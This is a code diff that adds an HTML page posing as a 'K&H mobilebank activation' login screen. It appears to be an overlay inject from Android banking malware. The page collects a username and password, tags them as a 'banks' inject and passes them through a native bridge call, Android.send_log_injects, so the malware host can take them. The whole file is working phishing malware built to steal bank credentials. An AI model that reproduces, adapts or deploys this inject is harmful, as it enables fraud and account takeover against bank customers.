@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        header {
+            padding: 15px;
+            border-bottom: 1px solid #386f84;
+            box-shadow: 0px 2px 5px #c5c2c2;
+        }
+
+        section {
+            padding: 15px;
+            margin: 0 auto;
+        }
+
+        .input {
+            width: 100%;
+            margin-bottom: 15px;
+            text-align: center;
+            border: 0;
+            border-bottom: 1px solid #386f84;
+            padding: 10px;
+        }
+
+        .button {
+            background-color: transparent;
+            color: #fff;
+            font-weight: 600;
+            border: 0;
+            border-radius: 2px;
+            padding: 14px 40px;
+            background-color: #00aeed;
+            display: block;
+            margin: 0 auto;
+        }
+
+        ::placeholder {
+            opacity: 1;
+            color: #c4c4c5;
+            font-size: 18px;
+        }
+
+        :-moz-placeholder {
+            opacity: 1;
+            color: #c4c4c5;
+            font-size: 18px;
+        }
+
+        ::-moz-placeholder {
+            opacity: 1;
+            color: #c4c4c5;
+            font-size: 18px;
+        }
+
+        :-ms-input-placeholder {
+            opacity: 1;
+            color: #c4c4c5;
+            font-size: 18px;
+        }
+
+        ::-webkit-input-placeholder {
+            opacity: 1;
+            color: #c4c4c5;
+            font-size: 18px;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 28px; float: left;margin-right: 30px;margin-top: 3px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADEAAAAoCAIAAADYJ4UYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDA2IDc5LjE2NDY0OCwgMjAyMS8wMS8xMi0xNTo1MjoyOSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIyLjIgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RkRFODkxNzk5OTc2MTFFQjg0NEVFQTRGQjQxRDc2NTAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RkRFODkxN0E5OTc2MTFFQjg0NEVFQTRGQjQxRDc2NTAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpGREU4OTE3Nzk5NzYxMUVCODQ0RUVBNEZCNDFENzY1MCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpGREU4OTE3ODk5NzYxMUVCODQ0RUVBNEZCNDFENzY1MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PhA1O2YAAAaQSURBVFjDtZhLjhzHEYa/iMysrp7hS6JIUYRlSQZo+CjeeOMD+Cy+iU/gnRdeeOmFV76AKQoQ/aAoYkgO+5mPCC+qml3zglk0VItGTqM7JvqP+P/4I8XdBXjqPHvKOqOCB1QJPXkPgF1+DZFZj9fDKQAQcQBUqAUaBlT6JU++4RdR3F3+9oJXr9ms6G+z7ClOyXgkpkk27XjWMC+n8bvTnASgFYBFICR2KzY7bvXcfyDuLn88wxRV4gIRTJFAEKpN4k5wGiJ++CMDTgrgejynQGl4AYVGrbhBiwAipIQ7OQNohxu7RozX5zRE/PBHh1I5gE/O6y0xIlAK6qSEQN1HgFipFZzUgVMbElgEPE964v+onZfjL5EJWtFpe7TRRcRphQAdESDvkQ4BM4LS9xDAMZv8srEMx7gznjBBd5JTiIhAoVZawRw3Wo4APSRFYV+xihVwKnTpiDOG+cf2+HvexUmKsN+NtcNZCF3CIQ+sXr0jFrqIB0QIkRTQbmwvfIQqHHCa3U/hAmB++PP2bcypmdaohVZphVwGLdjxes1mhQdigAiK6sWqGX7ASebiVK7nXYy0hhcM2h53bp1y9664u6zgO3j+I9WJkersMrVyevrT5rTZEgN9RCN1R0x89RlfI+7+H+zszds3q/MYFt2yV+2qubm0duSa4oB7A2RmTiaHfvJ4qD5A0iAiUTCzvFuZ2d07p4/v3BN3/65uY1h0ogIZKjjIsRXf823s9pmKid/MxgYCChEcsjcpNQKPt/uuc1JnVapbkGRghurlpNQdyN3bWTmlcls8mFxOsDUPQRQ3s6AWQqDlnHMEFstlzTmXTQy9xuDm5nK5xcfaOeBm83ByH795cS6pihkirqqtlZxzUuuWSxl9wQpeFzwShWH+LGB3pQByUW4+8Ik3FH4BGRwCWAP4NHA6fPwfb/nnS169oAhRqYIKsT8ANaj5wDgDaI9myviLI+NkwjtxcoFGVCwTAg8f8PhxBPj+jK0RPiF1dAkCZtSKphtm8K2ZQH12ebaMIQtdIArulD1mvHO+/zECrNdoYrGASIzEBWbkfJF57Qi9z/R0Mp13F9mcEgq1HqrRWK+HGfzVSMY8zJCOoLij8TpfBvHNzHH35ZV5POBUEcEatUKjSyi0EgdSIooKKYGDIoIq5terzEzeXSTw5BwC7qiS0thnrWEWAZaON7zSFJURswJdd+zrsccdQGbWTrfHuTv1T2XwBYY7XlBFHB94VyuqxETqEPCACn0gl9GFHp0TH+NVTI4aMI12+w5mh66ImNEybfC+p439it0OSahCQARdXECIib/L/Uwt2Ez4MVGE7LSGD12VR4d+axEBnjzi31tevqDU0RSbYQWVyzkN3SAzJ97Yf3J5fLY6nt1pjZS4f58vTiLw90e8kM0Pi10tSGfirVhz06kyKVP93M/UgqNXsYkrdG8ikgIiYmUXY334+eZnD07E3Z8fBoZe3OWmaOj1qjDDjU+V9z0DDdIhvoHCYCk53byMMXZdF1lUMNRxiD6JIxMdl5luxQ9rL+ATNZcxWlMk0iot512tVdy9sAEaZk2LEiS5e2siIbzXAnUDXAywmfqkqoC4AjbRAm8lhCDSmlvypjryWdz993BmbBtBaUoz1hADm0mR0kTqns6Up6/t+iV0EQiVBvcUUaKRlPtDTr/5Yfunb5/z7VNWK1KHKs0ohX4xKcAkcJqpT7VO+nOimetz+hOWHbmyW3Fyyq+e/O7JL8Xd5a9wtubNG0Q4PSEmUPCRq1dz+sj97srOqQoChVzZrgHu3ebe3cGr/Iu44O6d8SKlluMYunbG6dw9WK54FR3fzxmvLBacLqmV7Yqz1+Lu8pdzmtAMs0HCQK7Qyz9eDKJNtqhJfs1QJUJzfI9BCnRdHPcs1xGJkIgRDagc+uAqkebCNJlx09dFN96YtYZVmuOVYW9hD7EjxPFSZZtpgLPsb/AqM5MKNgkwySnvaQ0r9AuWd+kDectmG8f+aG1EJUT6HomXe/yneFJiuYRGq2zWAEHo+zjKhQgI7ojhBobI4S7rCu+if0yLT2/D3qPuZVxy9f08HZz15w85e8f5OSlxcooqpWHtwvyfnuf6zHDzLAoBVczY7KiVO7f49JMI/Pqb9Z/rM14943zHeYc7ueF+uGP1SUL+P/7H9fJUDp7k4v2TVdwJSghYpu+58/Pffqni7n+AH+A1LCGCHTxCnJBsel7NbJv+hkV1WFZ6iFBhB7fgC/gv7/Z28Aw2XL8AAAAASUVORK5CYII=" alt="">
+        
+            <span style="margin-top: 3px;display: inline-block;"> K&H mobilebank activation </span>
+        </header>
+        <section>
+            <input type="text" class="input" id="login" name="login" placeholder="username" autocomplete="off">
+            <input type="password" class="input" id="password" name="password" placeholder="password" autocomplete="off">
+        
+            <input type="submit" class="button" id="sendData" value="continue">
+        </section>
+    </form>
+    <script>
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var sendData = document.getElementById('sendData');
+
+        sendData.onclick = () => {
+            if(login.value.length < 4) {
+                login.classList.add('error');
+            } else {
+                login.classList.remove('error');
+            }
+
+            if(password.value.length < 4) {
+                password.classList.add('error');
+            } else {
+                password.classList.remove('error');
+            }
+
+            if(login.value.length >= 4 && password.value.length >= 4) {
+                var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+            }
+        }
+    </script>
+</body>
+</html>
